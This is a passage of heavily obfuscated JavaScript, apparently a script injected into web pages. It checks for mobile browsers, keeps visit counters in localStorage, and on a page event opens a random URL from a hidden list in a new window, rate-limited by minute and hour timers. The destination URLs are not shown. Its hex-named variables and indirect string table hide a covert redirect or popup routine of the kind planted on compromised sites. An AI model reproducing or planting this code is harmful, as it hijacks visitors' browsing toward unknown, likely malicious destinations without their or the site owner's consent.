|nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());